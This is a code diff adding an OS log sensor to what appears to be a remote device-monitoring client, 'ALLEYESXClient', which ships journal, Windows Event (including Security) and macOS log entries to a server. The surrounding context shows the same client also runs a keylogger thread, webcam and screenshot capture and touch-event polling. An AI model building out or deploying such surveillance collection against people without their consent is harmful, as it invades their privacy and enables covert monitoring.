@@ -274,6 +274,9 @@ TOUCH_POLL_INTERVAL = float(os.environ.get('ALLEYESX_TOUCH_POLL_INTERVAL', '0.5'
 # snapshot, and ARP neighbours change slowly.
 FLOW_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_FLOW_INTERVAL', '15'))
 LINK_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_LINK_INTERVAL', '60'))
+# Log shipping. Reads the OS log, so it is throttled harder than connections.
+LOG_REPORT_INTERVAL = float(os.environ.get('ALLEYESX_LOG_INTERVAL', '60'))
+LOG_BATCH_SIZE = int(os.environ.get('ALLEYESX_LOG_BATCH', '150'))
 DIRTY_RECT_THRESHOLD = 0.005
 SCREENSHOT_QUALITY = 70
 WEBCAM_QUALITY = 65
@@ -2112,6 +2115,174 @@ def _read_proc_connections(path, protocol):
     return rows
 
 
+# ============================================================
+# LOG SENSOR
+# ------------------------------------------------------------
+# Reads the operating system's own log. journalctl on Linux, Get-WinEvent on
+# Windows, `log show` on macOS. Nothing is shipped that the OS did not already
+# record, and events the OS did not produce are not invented.
+# ============================================================
+
+def _severity_from_text(text):
+    """Coarse severity from a log line, so the UI can filter without guessing."""
+    low = str(text).lower()
+    if any(k in low for k in ('crit', 'fatal', 'emerg', 'panic', 'error 1')):
+        return 'critical'
+    if 'err' in low or 'fail' in low or 'denied' in low:
+        return 'high'
+    if 'warn' in low:
+        return 'medium'
+    if 'info' in low or 'notice' in low:
+        return 'info'
+    return 'info'
+
+
+def log_sensor_status():
+    """Why the log sensor can or cannot read.
+
+    "No events" and "cannot read the journal" must not look the same in the UI:
+    the first means the system is quiet, the second means the agent user needs
+    the systemd-journal (or adm) group. Reporting the reason keeps the panel
+    honest instead of implying there is nothing to see.
+    """
+    kind = platform_kind()
+    if kind == 'android' or sys.platform.startswith('linux'):
+        if not shutil.which('journalctl'):
+            return {'available': False, 'reason': 'journalctl not installed'}
+        try:
+            out = subprocess.check_output(
+                ['journalctl', '-n', '1', '-o', 'short-iso', '--no-pager'],
+                timeout=15, stderr=subprocess.STDOUT,
+            ).decode('utf-8', errors='ignore')
+        except subprocess.CalledProcessError as exc:
+            text = (exc.output or b'').decode('utf-8', errors='ignore')
+            if 'insufficient permissions' in text.lower():
+                return {
+                    'available': False,
+                    'reason': 'journal access denied - run the agent as a user in the '
+                              'systemd-journal or adm group',
+                }
+            return {'available': False, 'reason': text.strip()[:160] or 'journalctl failed'}
+        except Exception as exc:
+            return {'available': False, 'reason': str(exc)[:160]}
+        return {'available': True, 'reason': 'journalctl'}
+
+    if sys.platform == 'win32':
+        return {'available': bool(shutil.which('powershell')),
+                'reason': 'Get-WinEvent' if shutil.which('powershell') else 'powershell not found'}
+
+    if sys.platform == 'darwin':
+        return {'available': bool(shutil.which('log')),
+                'reason': 'log show' if shutil.which('log') else 'log not found'}
+
+    return {'available': False, 'reason': 'unsupported platform'}
+
+
+def collect_log_events(limit=150):
+    """Recent operating-system log events, newest first."""
+    kind = platform_kind()
+
+    if kind == 'android' or sys.platform.startswith('linux'):
+        if not shutil.which('journalctl'):
+            return []
+        try:
+            out = subprocess.check_output(
+                ['journalctl', '-n', str(limit), '-o', 'short-iso', '--no-pager', '-q'],
+                timeout=25, stderr=subprocess.DEVNULL,
+            ).decode('utf-8', errors='ignore')
+        except Exception:
+            return []
+        events = []
+        for line in out.splitlines():
+            line = line.strip()
+            if not line or line.startswith('--'):
+                continue
+            # short-iso: "2026-09-01T05:00:00+0000 host unit[pid]: message"
+            parts = line.split(' ', 3)
+            if len(parts) < 4:
+                continue
+            timestamp, host, unit, message = parts[0], parts[1], parts[2], parts[3]
+            events.append({
+                'timestamp': timestamp,
+                'source': 'journalctl',
+                'host': host,
+                'unit': unit.split('[')[0],
+                'event_id': '',
+                'message': message,
+                'severity': _severity_from_text(message),
+            })
+        return events[:limit]
+
+    if sys.platform == 'win32':
+        if not shutil.which('powershell'):
+            return []
+        script = (
+            "Get-WinEvent -LogName System,Application,Security -MaxEvents "
+            f"{int(limit)} -ErrorAction SilentlyContinue | "
+            "Select-Object TimeCreated,ProviderName,Id,LevelDisplayName,Message | "
+            "ConvertTo-Json -Compress -Depth 2"
+        )
+        try:
+            out = subprocess.check_output(
+                ['powershell', '-NoProfile', '-Command', script],
+                timeout=60, stderr=subprocess.DEVNULL,
+            ).decode('utf-8', errors='ignore').strip()
+        except Exception:
+            return []
+        if not out:
+            return []
+        try:
+            parsed = json.loads(out)
+        except Exception:
+            return []
+        if isinstance(parsed, dict):
+            parsed = [parsed]
+        events = []
+        for e in parsed:
+            if not isinstance(e, dict):
+                continue
+            message = str(e.get('Message') or '')
+            events.append({
+                'timestamp': str(e.get('TimeCreated') or ''),
+                'source': 'windows-event',
+                'host': platform.node(),
+                'unit': str(e.get('ProviderName') or ''),
+                'event_id': str(e.get('Id') or ''),
+                'message': message[:500],
+                'severity': str(e.get('LevelDisplayName') or '').lower() or _severity_from_text(message),
+            })
+        return events[:limit]
+
+    if sys.platform == 'darwin':
+        try:
+            out = subprocess.check_output(
+                ['log', 'show', '--last', '30m', '--style', 'syslog'],
+                timeout=60, stderr=subprocess.DEVNULL,
+            ).decode('utf-8', errors='ignore')
+        except Exception:
+            return []
+        events = []
+        for line in out.splitlines()[1:]:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split(None, 4)
+            if len(parts) < 5:
+                continue
+            events.append({
+                'timestamp': ' '.join(parts[:2]),
+                'source': 'macos-log',
+                'host': platform.node(),
+                'unit': parts[3],
+                'event_id': '',
+                'message': parts[4][:500],
+                'severity': _severity_from_text(parts[4]),
+            })
+        return events[-limit:]
+
+    return []
+
+
 def collect_network_connections(limit=400):
     """Current connections on this machine, from the kernel's own tables."""
     if platform_kind() == 'android' or sys.platform.startswith('linux'):
@@ -3093,6 +3264,7 @@ class ALLEYESXClient:
         self.last_touch_poll_time = 0
         self.last_flow_report_time = 0
         self.last_link_report_time = 0
+        self.last_log_report_time = 0
         self.last_hardware_report_time = 0
         self.keylogger_thread = None
         self.touch_event_id = 0
@@ -3364,6 +3536,19 @@ class ALLEYESXClient:
             return
         api_request(f'/api/device/{self.device_id}/links', links)
 
+    def send_log_events(self):
+        """Ship recent OS log events. The server de-duplicates by (device, timestamp, message)."""
+        now = time.time()
+        if now - self.last_log_report_time < LOG_REPORT_INTERVAL:
+            return
+        self.last_log_report_time = now
+        try:
+            events = collect_log_events(LOG_BATCH_SIZE)
+        except Exception:
+            return
+        payload = {'events': events, 'sensor': log_sensor_status()}
+        api_request(f'/api/device/{self.device_id}/logs', payload)
+
     def poll_touch_events(self):
         now = time.time()
         if now - self.last_touch_poll_time < TOUCH_POLL_INTERVAL:
@@ -3495,6 +3680,7 @@ class ALLEYESXClient:
                 self.send_software_inventory()
                 self.send_network_flows()
                 self.send_network_links()
+                self.send_log_events()
                 
                 screenshot_counter += 1
                 webcam_counter += 1
